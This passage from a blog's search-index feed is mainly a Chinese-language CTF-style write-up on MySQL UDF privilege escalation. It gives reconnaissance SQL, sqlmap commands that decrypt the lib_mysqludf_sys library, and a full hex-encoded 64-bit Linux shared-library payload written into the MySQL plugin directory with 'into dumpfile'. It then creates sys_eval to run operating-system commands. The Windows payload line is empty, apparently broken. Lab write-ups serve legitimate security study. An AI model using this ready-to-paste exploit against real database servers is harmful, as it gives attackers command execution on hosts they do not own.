class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/617758104</span><br><span class="line">https://pythonjishu.com/dxmuzvsyrdduifx/</span><br><span class="line">https://github.com/patriksimek/vm2/security/advisories/GHSA-7jxr-cg7f-gpgv</span><br><span class="line">https://github.com/patriksimek/vm2</span><br><span class="line">https://github.com/patriksimek/vm2/issues/225</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Nodejs </category>
          
          <category> 沙箱逃逸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL UDF提权</title>
      <link href="/2023/08/25/MySQL%20UDF%E6%8F%90%E6%9D%83/"/>
      <url>/2023/08/25/MySQL%20UDF%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><code>UDF</code>（ <code>user defined function</code> ）用户自定义函数，是 <code>MySQL</code> 的一个扩展接口，称为用户自定义函数,是用来拓展 <code>MySQL</code> 的技术手段，用户通过自定义函数来实现在 <code>MySQL</code> 中无法实现的功能。文件后缀为 <code>.dll</code> 或 <code>.so</code> ，常用 <code>c</code> 语言编写。拿到一个 <code>WebShell</code> 之后，在利用操作系统本身存在的漏洞提权的时候发现补丁全部被修补。这个时候需要利用第三方应用提权。当 <code>MYSQL</code> &#x3D;&#x3D;权限比较高&#x3D;&#x3D; 的时候我们就可以利用 <code>udf</code> 提权。</p><blockquote><p><code>udf</code> 提权本质上并不是真正意义上的提权，只是通过当前 <strong>mysql的运行权限</strong> 去执行系统命令，如果<code>mysql</code> 运行权限太低的话同样也没有特别大的意义！！！</p></blockquote><h1 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h1><ul><li><code>mysql</code> 允许导入导出文件，也就是 <code>secure_file_priv</code> 的值为空（为空不是为 <code>NULL</code> ）</li><li>高权限用户启动，如 <code>root</code> 。该账号需要有对数据库 <code>mysql</code> 的 <code>insert</code> 和 <code>delete</code> 权限，其实是操作里面的<code>func</code> 表，所以 <code>func</code> 表也必须存在。而且这样才能有权限写入文件到目标文件夹中，不然大概率写不进去。</li><li>未开启 <code>‑‑skip‑grant‑tables</code> 。开启的情况下，<code>UDF</code> 不会被加载，默认不开启。</li></ul><blockquote><p><code>secure_file_priv</code> 是用来限制 <code>load dumpfile</code> 、<code>into outfile</code> 、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限。</p><p>当 <code>secure_file_priv</code> 的值为 <code>null</code> ，表示限制 <code>mysqld</code> 不允许导入|导出，此时无法提权；<br>当 <code>secure_file_priv</code> 的值为 <code>/tmp/</code> ，表示限制 <code>mysqld</code> 的导入|导出只能发生在 <code>/tmp/</code> 目录下，此时也无法提权；<br>当 <code>secure_file_priv</code> 的值没有具体值时，表示不对 <code>mysqld</code> 的导入|导出做限制，此时可提权。</p><p>在 <code>mysql5.5</code> 版本之前 <code>secure_file_priv</code> 这个值是默认为空的，那么我们拿到的 <code>webshell</code> 如果对应的 <code>mysql</code> 数据库版本在 <code>5.5</code> 以下的话操作起来就比较方便，在 <code>mysql5.5</code> 版本之后 <code>secure_file_priv</code> 这个值是默认为 <code>NULL</code> 的，即不能够在数据库中导入导出文件。</p></blockquote><blockquote><p>此外，<code>MySQL</code> 的默认启动用户是 <code>mysql</code> ，因此其权限比较低，需要运维配置错误给 <code>MySQL</code> 的启动用户过高的权限此漏洞才能利用成功。</p></blockquote><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>首先最基本的是要开启 <code>MySQL</code> 允许外部连接。</p><p><img src="/imgs/1692613411786.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这个版本的MySQL的secure_file_priv默认为null，也就是不允许写入，导出文件的，因此我们需要在MySQL的配置文件my.ini中修改</span><br><span class="line">mysql 5.5.62</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看secure_file_priv的配置</span><br><span class="line">show global variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p>默认为 <code>NULL</code> ，因此为了复现漏洞，我们需要修改这里的参数。</p><p><img src="/imgs/1692528383808.png"></p><p>参数通过 <code>my.cnf</code> 文件中修改。</p><p><img src="/imgs/1692582087186.png"></p><p>同时我们还有修改 <code>MySQL</code> 的启动用户，以 <code>root</code> 用户高权限身份启动 <code>MySQL</code> ，后面才能将 <code>udf.so</code> 上传到 <code>MySQL</code> 的 <code>plugin</code> 目录。</p><p><img src="/imgs/1692612450671.png"></p><p>修改后要重启 <code>MySQL</code> 。</p><p><img src="/imgs/1692582107204.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="判断漏洞利用前提条件"><a href="#判断漏洞利用前提条件" class="headerlink" title="判断漏洞利用前提条件"></a>判断漏洞利用前提条件</h4><p>当我们拿到 <code>MySQL</code> 的控制权后，先通过 <code>show variables like &quot;%secure_file_priv%&quot;;</code> 命令查看是否允许导入导出文件。</p><p><img src="/imgs/1692582815101.png"></p><p>再通过 <code>select * from mysql.user where user = substring_index(user(), &#39;@&#39;, 1);</code> 查看当前数据库是否高权限。</p><p><img src="/imgs/1692583067591.png"></p><h4 id="上传UDF库文件"><a href="#上传UDF库文件" class="headerlink" title="上传UDF库文件"></a>上传UDF库文件</h4><ol><li>先通过 <code>select @@basedir;</code> 命令获取 <code>MySQL</code> 的安装目录。</li></ol><p><img src="/imgs/1692609973383.png"></p><ol start="2"><li>再通过 <code>show variables like &quot;%plugin%&quot;;</code> 命令获取 <code>plugin</code> 的路径。</li></ol><p><img src="/imgs/1692583659821.png"></p><ol start="3"><li>再通过 <code>select @@version_compile_os, @@version_compile_machine;</code> 命令来查看目标机器的架构情况，依此来选择上传什么版本的 <code>UDF</code> 库文件到目标机器。</li></ol><p><img src="/imgs/1692582321050.png"></p><ol start="4"><li>再准备 <code>UDF</code> 库文件。</li></ol><ul><li>从 <code>sqlmap</code> 中获取</li></ul><p><code>sqlmap</code> 中有现成的 <code>udf</code> 文件。分别是 <code>32</code> 位和 <code>64</code> 位的。这里选择<code>sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</code> 。</p><p>不过这里的 <code>so</code> 文件是异或过的，需要执行以下命令解密：</p><p><img src="/imgs/1692583892344%201.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak/</span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>此时会在和原本 <code>so</code> 文件相同的目录生成解密后的 <code>lib_mysqludf_sys.so</code> 文件。</p><ol start="5"><li>上传 <code>UDF</code> 文件到 <code>MySQL</code> 的插件目录中（要么是 <code>show variables like &quot;%plugin%&quot;</code> 返回的结果，要么是 <code>select @@basedir;</code> 的结果加上 <code>/lib/plugin</code> ，通过 <code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</code> 的报错信息来获取应该上传到哪个目录。）</li></ol><p><img src="/imgs/1692612743818.png"></p><blockquote><p>如果没有这个目录，就自己手动创建一个目录。</p></blockquote><p>通过下面的命令上传文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so&#x27;) into dumpfile &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>但是 <code>load_file</code> 大概率无法正确返回 <code>so</code> 文件的结果，为了解决这个问题，我们可以手动复制这个文件的十六进制内容来手工导入。</p></blockquote><p><img src="/imgs/1692611648772.png"></p><p>我们可以通过 <code>xxd</code> 命令来获取二进制文件的十六进制表示，<code>-p</code> 参数表示只显示十六进制的内容，不显示其它信息。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692611897088.png"><br><code>linux-x64 payload</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 into dumpfile &#x27;/usr/local/mysql/lib/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure><p>然后就可以通过 <code>so</code> 文件加载外部函数，然后利用外部函数调用系统命令了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692612275098.png"></p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="漏洞环境搭建-1"><a href="#漏洞环境搭建-1" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>和 <code>linux</code> 基本类似，但是需要注意的是 <code>windows</code> 的 <code>phpstudy</code> 不能直接开放 <code>MySQL</code> 外部连接，需要使用下面的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to 自己的用户名@&#x27;%&#x27; identified by &#x27;密码&#x27;; </span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>然后就可以外部连接本机的 <code>MySQL</code> 了。</p><p>然后依旧是需要保持 <code>secure_file_priv</code> 的值为空。（不过这个版本 <code>5.5.29</code> 的 <code>MySQL</code> 的这个属性默认就是空的。）</p><p><img src="/imgs/1692613710480.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>还是先信息收集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692613923125.png"></p><p>然后在 <code>kali</code> 的 <code>sqlmap</code> 中获取 <code>windows-x64</code> 版本的 <code>udf</code> 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak/</span><br><span class="line">python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692614087711.png"></p><p>再通过 <code>xxd</code> 命令获取 <code>payload</code> 。</p><p><img src="/imgs/1692614141853.png"></p><p><code>windows-x64</code> 的 <code>payload</code> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select into dumpfile &#x27;D:/phpstudy_pro/Extensions/MySQL5.5.29/lib/plugin/udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p>然后执行下面的命令就可以成功提权了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 注意这里如果找不到这个文件，报错和linux不一样</span><br><span class="line"># windows会报错：ERROR 1126 (HY000): Can&#x27;t open shared library &#x27;udf.dll&#x27; (errno: 126 )</span><br><span class="line"># 而不是报错找不到这个文件</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1692614584661.png"></p><h1 id="windows利用和linux的不同"><a href="#windows利用和linux的不同" class="headerlink" title="windows利用和linux的不同"></a>windows利用和linux的不同</h1><p><code>Linux</code> 的用户权限划分比较严格，因此需要运维人员配置错误 <code>MySQL</code> 的启动权限比较高才能利用成功。而 <code>windows</code> 用户权限划分比较宽松，默认的启动权限就可以利用成功。</p><p>还有上面在没有找到 <code>udf</code> 文件的情况下，两个系统的报错信息也不同，<code>Linux</code> 会报错显示出目标 <code>udf</code> 文件不存在，并且显示出了插件库正确应当存放的路径，而 <code>windows</code> 只会报错显示无法打开这个文件，不会显示插件库的具体路径，但是还是可以通过 <code>show variables like &quot;%plugin%&quot;;</code> 来泄露插件库的存放路径。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md</span><br><span class="line">https://juejin.cn/post/7100562573254213668#heading-16</span><br><span class="line">https://www.cnblogs.com/mrhonest/p/10836621.html</span><br><span class="line">https://www.cnblogs.com/miansj/p/13996110.html</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/121193134</span><br><span class="line">https://www.freebuf.com/vuls/348300.html</span><br><span class="line">https://blog.csdn.net/whatday/article/details/102807541</span><br><span class="line">https://www.sqlsec.com/2020/11/mysql.html#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93</span><br><span class="line">https://blog.51cto.com/u_16175511/6673705</span><br><span class="line">https://www.sqlsec.com/tools/udf.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 提权 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
